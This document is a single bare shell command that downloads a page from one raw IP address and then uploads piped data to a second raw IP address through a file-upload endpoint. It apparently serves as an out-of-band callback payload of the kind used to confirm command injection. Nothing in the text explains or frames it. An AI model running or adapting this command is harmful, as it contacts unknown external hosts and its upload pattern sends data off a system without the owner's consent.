curl http://193.239.86.192:8080/indox.html && printf 'c' | sh -c "curl -s -X POST http://162.128.228.211:8012/fileUpload -F 'file=@-;filename=c'"
